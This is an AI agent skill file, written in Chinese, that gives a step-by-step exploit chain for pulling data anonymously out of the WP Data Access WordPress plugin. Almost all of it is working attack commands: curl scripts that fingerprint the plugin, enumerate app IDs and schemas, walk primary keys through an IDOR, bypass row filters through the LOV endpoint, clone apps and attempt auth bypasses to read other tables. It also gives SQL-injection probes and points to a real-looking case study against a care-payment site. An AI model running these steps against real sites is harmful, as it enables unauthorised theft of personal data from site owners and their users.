---
name: wpda-anonymous-data-exfil
description: >-
  WP Data Access (Premium) 插件匿名数据泄露全链：REST API anonymous authorization →
  app/get IDOR 主键遍历 → app/lov 绕过 defaultWhere → app/copy 匿名克隆 →
  app/save FormData 鉴权绕过 → 类型系统死锁突破 → 跨表读取。
  用户提到 WPDA、WP Data Access、wpda/app、app_id、defaultWhere、app/lov、
  FormData 鉴权绕过、类型系统死锁、PHP 数组语法时使用。
  WordPress 通用插件漏洞走 wordpress-plugin-unauth-takeover；
  xmlrpc 走 wordpress-xmlrpc-surface；REST CORS 走 wp-rest-cors-ato。
version: 1.0.0
---

# WP Data Access (WPDA) 匿名数据泄露全链（Cursor Skill）

## 何时用

- WordPress 站发现 `/wp-json/wpda/` 或 `/wp-json/wpda/v2/` 路由
- 页面源码含 `PP_APP_CONFIG`、`pp_app_`、`wpda_datatables`、`pwa` shortcode
- REST API namespace 枚举出现 `wpda` 或 `wpda/v2`
- 用户提到 WP Data Access / WP Data Access Premium
- `nday_route` 或 `strike_probe` 扫到 WPDA 指纹

## 真源

1. 本 SKILL.md
2. `references/seniorcarecopay-case-study.md`（完整实战案例）
3. `references/wpda-endpoint-matrix.md`（端点权限矩阵速查表）

## 杀伤链概览

```
指纹识别 → meta 拿 schema → export 拿 DDL → get IDOR → lov 绕 defaultWhere → copy 克隆 → save 改表指向
   S1        S2               S3              S4          S5                    S6           S7
```

---

## S1: 指纹识别

```bash
# REST API namespace 枚举
curl -sk https://TARGET/wp-json/ | python3 -c "
import sys,json
d=json.load(sys.stdin)
for ns in sorted(d.get('namespaces',[])):
    if 'wpda' in ns.lower(): print(f'[HIT] {ns}')
"

# 页面源码扫描
curl -sk https://TARGET/ | grep -oiE 'wpda|PP_APP_CONFIG|pp_app_\d+|wpda_datatables|pwa.*app_id'

# 版本识别（changelog）
curl -sk https://TARGET/wp-content/plugins/wp-data-access-premium/changelog.txt | head -20
curl -sk https://TARGET/wp-content/plugins/wp-data-access/changelog.txt | head -20
```

**版本关键点**：
- WPDA 的 REST API 版本可能在 v2 和无版本之间切换
- 先试 `/wp-json/wpda/` 再试 `/wp-json/wpda/v2/`
- 热补丁可能改变端点行为，保持两个前缀同时探测

## S2: Meta 枚举（schema + 配置）

```bash
# 获取 WP Nonce（从任何页面）
NONCE=$(curl -sk https://TARGET/任意页面/ | grep -oP 'wpApiSettings.*?"nonce":"\\K[^"]+')

# 枚举 app_id 1-20
for i in $(seq 1 20); do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' \
    -X POST "https://TARGET/wp-json/wpda/app/meta" \
    -H "X-WP-Nonce: $NONCE" \
    -F "app_id=$i")
  echo "app_id=$i → $STATUS"
done

# 获取完整 schema（找到 200 的 app_id 后）
curl -sk -X POST "https://TARGET/wp-json/wpda/app/meta" \
  -H "X-WP-Nonce: $NONCE" \
  -F "app_id=3" | python3 -m json.tool
```

**关键提取项**：
- `authorization` 字段 → `"anonymous"` = 命中
- `defaultWhere` → 行级过滤逻辑
- `app_settings.wp.users` → 管理员用户名
- `app_settings.wp.tables` → WP 系统表列表
- `containers[].cnt_id` → 容器 ID（后续 IDOR 用）
- `containers[].table_name` → 实际表名
- `app_cls` → 列定义（后续类型死锁用）
- `app_server_calls` → PHP 类注册情况

## S3: DDL 导出

```bash
curl -sk -X POST "https://TARGET/wp-json/wpda/app/export" \
  -H "X-WP-Nonce: $NONCE" \
  -F "app_id=3" | python3 -m json.tool
```

DDL 含完整 CREATE TABLE 语句、列类型、索引、外键约束。与 meta 交叉验证。

## S4: IDOR 主键遍历（app/get）

**核心漏洞**：`app/get` 按主键直读单条记录，完全绕过 `defaultWhere`。

```bash
# 单条读取
curl -sk -X POST "https://TARGET/wp-json/wpda/app/get" \
  -H "X-WP-Nonce: $NONCE" \
  -F "app_id=3" -F "cnt_id=2" \
  -F "key[主键列名]=100"

# 批量遍历（找主键范围）
for i in 1 10 100 1000 10000 100000 1000000; do
  RESP=$(curl -sk -X POST "https://TARGET/wp-json/wpda/app/get" \
    -H "X-WP-Nonce: $NONCE" \
    -F "app_id=3" -F "cnt_id=2" \
    -F "key[主键列名]=$i")
  echo "PK=$i → $(echo $RESP | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("code","err"))')"
done
```

**注意**：
- `key` 参数支持多种形式：`key[列名]=值`
- 非主键列也可能命中索引：试 `key[source_id]=值`、`key[其他唯一列]=值`
- 主键范围通过二分法确定上界

## S5: LOV 绕过 defaultWhere（全量列值枚举）

**这是最关键的发现**：`app/lov`（List of Values）完全忽略 `defaultWhere` 过滤条件。

```bash
# 枚举某列所有不重复值
curl -sk -X POST "https://TARGET/wp-json/wpda/app/lov" \
  -H "X-WP-Nonce: $NONCE" \
  -d "app_id=3&cnt_id=2&col=claimant_id&search="

# 对每个有意义的列都试一次
for col in claimant_id source_id source_table cf_status provider_name; do
  COUNT=$(curl -sk -X POST "https://TARGET/wp-json/wpda/app/lov" \
    -H "X-WP-Nonce: $NONCE" \
    -d "app_id=3&cnt_id=2&col=$col&search=" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(len(d.get('data',[])))
")
  echo "col=$col → $COUNT distinct values"
done
```

**为什么 LOV 能绕过**：
- `app/select` 用 `WHERE defaultWhere` 过滤 → 需要知道合法参数值
- `app/lov` 内部执行 `SELECT DISTINCT col FROM table` → 无 WHERE 子句
- 这是 WPDA 的设计缺陷：LOV 本来用于下拉框填充，但暴露了全表数据

## S6: 匿名克隆（app/copy）

```bash
curl -sk -X POST "https://TARGET/wp-json/wpda/app/copy" \
  -H "X-WP-Nonce: $NONCE" \
  -F "app_id=3"
# → 200 "App successfully copied"
```

**用途**：
- 创建出新的 app_id（如 4, 5, 6...）
- 新应用继承 `authorization: "anonymous"`
- **但** `target_tbl` 参数被忽略——副本始终指向原表
- 目的是为后续 `app/save` 修改表指向创建目标

## S7: 类型系统死锁突破（app/save）

这是本 Skill 的核心难点和知识积累。

### 死锁原理

```
FormData 请求:
  ├── 鉴权检查: 走 FormData 路径 → ✅ 绕过（返回 400 而非 401）
  └── 参数类型: app_cls 发的是字符串 → ❌ 需要 JSON 数组

JSON 请求:
  ├── 鉴权检查: 走 JSON 路径 → ❌ 触发 401 Unauthorized
  └── 参数类型: app_cls 是原生数组 → ✅ 类型正确

两条路互斥 → 死锁
```

### 突破方法（按优先级）

**方法 1: PHP 数组语法（param[]）**
```bash
# PHP 处理 FormData 时 param[] 自动解析为数组
curl -sk -X POST "https://TARGET/wp-json/wpda/app/save" \
  -H "X-WP-Nonce: $NONCE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'app_id=4&cnt_id=3&app_tbl=目标表名' \
  -d 'app_cls[0][columnName]=col1&app_cls[0][isSelected]=true' \
  -d 'app_cls[1][columnName]=col2&app_cls[1][isSelected]=true'
```

**注意**：PHP 的 `param[]` 会产生数组，但 `isSelected=true` 在 PHP 中是字符串 `"true"` 而非布尔值 `true`。
如果 WPDA 的 `validate_callback` 用 `===` 严格比较布尔值，这条路仍然会失败。
实测中 seniorcarecopay 案例确认此法未能突破，因为 WPDA 内部对 `isSelected` 做了 `is_bool()` 检查。

**方法 2: admin-ajax.php DataTables 回调**
```bash
# 绕过整个 REST API 鉴权体系
curl -sk -X POST "https://TARGET/wp-admin/admin-ajax.php" \
  -d 'action=wpda_datatables' \
  -d 'pub_id=已知值' \
  -d 'wpda_table_name=目标表' \
  -d 'draw=1&start=0&length=10'

# 变体：带列搜索
curl -sk -X POST "https://TARGET/wp-admin/admin-ajax.php" \
  -d 'action=wpda_datatables_ajax' \
  -d 'wpda_table_name=目标表' \
  -d 'draw=1&columns[0][data]=member_id'
```

注意：需要 `pub_id`（Publication ID），通常在含 WPDA 表格的页面 HTML 中可以找到。

**方法 3: Content-Type 混合**
```bash
# 声明 form-data 但发 JSON body
curl -sk -X POST "https://TARGET/wp-json/wpda/app/save" \
  -H "Content-Type: multipart/form-data; boundary=----fake" \
  -d '{"app_id":4,"app_cls":[{"columnName":"*","isSelected":true}],"app_tbl":"目标表"}'

# 声明 urlencoded 但 JSON 编码值
curl -sk -X POST "https://TARGET/wp-json/wpda/app/save" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'app_cls=[{"columnName":"*","isSelected":true}]' \
  -d 'app_id=4&app_tbl=目标表'
```

**方法 4: relationship/create 建 JOIN**
```bash
curl -sk -X POST "https://TARGET/wp-json/wpda/app/relationship/create" \
  -H "X-WP-Nonce: $NONCE" \
  -H "Content-Type: application/json" \
  -d '{
    "app_id": 4,
    "app_cls": [{"columnName":"*","isSelected":true}],
    "app_relation": "lookup",
    "app_tbl": "源表",
    "target_tbl": "目标表",
    "source_column": "关联键",
    "target_column": "关联键"
  }'
```

注意：JSON 请求在 relationship/create 上会先通过 `app_cls` 验证，但可能在 `app_relation` 参数上触发新的类型错误或回退到鉴权检查。

## SQL 注入面分析

### col 参数（app/lov）
```
输入: col=xxx` UNION SELECT 1--
处理: strip_backticks(col) → wrap_backticks → `xxx UNION SELECT 1--`
MySQL: Unknown column 'xxx UNION SELECT 1--'
```

**反引号剥离 + 重包裹 = 不可逃逸**。测试过：
- 双重 URL 编码、NULL 字节、反斜杠转义、全角反引号、Unicode 修饰符
- 全部失败

### search 参数
- 使用 `wpdb->prepare()` 参数化查询
- 实测发现 search 参数**完全不参与 SQL WHERE**（所有搜索值返回相同结果）
- 可能仅用于前端 JS 过滤

---

## 成功口径

| 级别 | 口径 |
|------|------|
| L1 | `app/meta` 返回 `authorization: "anonymous"` + 完整 schema |
| L2 | `app/get` IDOR 读出任意记录 + `app/lov` 绕过 defaultWhere 枚举全量 |
| L3 | 类型死锁突破 → 修改应用指向 → 跨表读取敏感数据 |

## 不要做

- 未进 scope 不打
- 不要只跑 meta 就结案——必须验证 IDOR（app/get）和 LOV 绕过
- 不要在没确认 app_cls 格式的情况下盲目发 save 请求
- 不要忽略 WPDA 版本号——不同版本端点路径和鉴权逻辑不同

## 衔接

- WordPress 通用插件漏洞 → `wordpress-plugin-unauth-takeover`
- WordPress 攻击路由 → `wordpress-attack-router`
- 进了 WP 后台 → 对象矩阵
- IDOR 深挖 → `idor-testing`
- SQL 注入面 → `sql-injection-testing`
- Cloudflare 挡住 → `cloudflare-bypass`

## 踩坑记录（必读）

详见 `references/seniorcarecopay-case-study.md` 第五节。核心教训：

1. **WPDA REST API 版本会变**：`/wpda/v2/` 可能突然变成 `/wpda/`，需双前缀探测
2. **热补丁检测**：端点行为突然改变（如 GET 变 POST-only）= 运维在修
3. **FormData vs JSON 鉴权差异**：这是 WordPress REST API 的通用模式，不仅限于 WPDA
4. **defaultWhere ≠ 真正的行级安全**：LOV/GET 都可绕过，只有 SELECT 受限
5. **GF 蜜罐字段**：input_12 必须留空，gform_ajax 参数触发反机器人
6. **CF WAF 在 IIS 前面**：所有 SQL 关键词被 CF 拦截，看不到 IIS 的真实响应
7. **PHP `param[]` 不能产生布尔值**：`isSelected=true` → 字符串 `"true"`，不是 `bool(true)`
8. **search 参数可能是装饰**：不参与实际 SQL 查询，测试 SQL 注入时不要只测这个
